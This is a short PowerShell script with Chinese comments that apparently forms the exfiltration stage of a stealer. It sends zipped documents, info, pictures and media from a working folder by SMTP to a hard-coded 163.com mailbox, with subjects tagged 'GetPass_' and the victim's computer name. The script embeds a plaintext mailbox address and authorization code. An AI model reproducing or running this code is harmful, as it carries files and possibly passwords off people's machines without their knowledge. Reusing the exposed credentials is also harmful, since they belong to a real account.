

function sendMailMessage ($mailTitle, $Attach) {
    #邮箱地址
    $SMTPServer = "smtp.163.com"
    #邮件发件人
    $MailForm = "14778555757@163.com"
    #邮件收件人
    $MailTo = "14778555757@163.com"
    #邮箱用户名
    $Username = "14778555757@163.com"
    #邮箱授权码
    $Password = "zzmO5XPEnGzhmlis"
    #
    $Cred = new-object PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))
    #邮件主题
    $computer=Get-WMIObject Win32_ComputerSystem
    $Cname = $computer.name
    $date =  (get-date).ToString('yyyy-MM-dd HH:mm:ss');
    $Subject = "GetPass_" + $Cname + "_" + $mailTitle + "_" +  $date
    #附件
    #邮件抄送人
    $Bcc = ""
    #邮件内容
    $MailBody = ""
    #副本
    $Cc = ""
    #送达通知
    $DeliveryNotificationOption
    #邮件正文HTML
    $BodyAsHtml
    #文本编码
    $Encoding
    #
    $Port = 994
    #邮件优先级
    $Priority
    #
    $UseSsl


    Send-MailMessage `
    -From $MailForm `
    -Subject $Subject `
    -To $MailTo `
    -Attachments $Attach `
    -Credential $Cred `
    -SmtpServer $SMTPServer
    #-DeliveryNotificationOption `
    #-Cc $Cc `
    #-Bcc $Bcc `
    #-Body $MailBody `
}

sendMailMessage 'Docs' $workPath'/doc.zip'
sendMailMessage 'Info' $workPath'/info.zip'
sendMailMessage 'Pic' $workPath'/pic.zip'
sendMailMessage 'Media' $workPath'/media.zip'

#$param = @{
#SmtpServer = 'smtp.gmail.com'
#Port = 587
#UseSsl = $true
#Credential  = 'user1@domain.com'
#From = 'user1@domain.com'
#To = 'user2@domain.com'
#Subject = 'test'
#Body = "testtext"
#}
#Send-MailMessage @param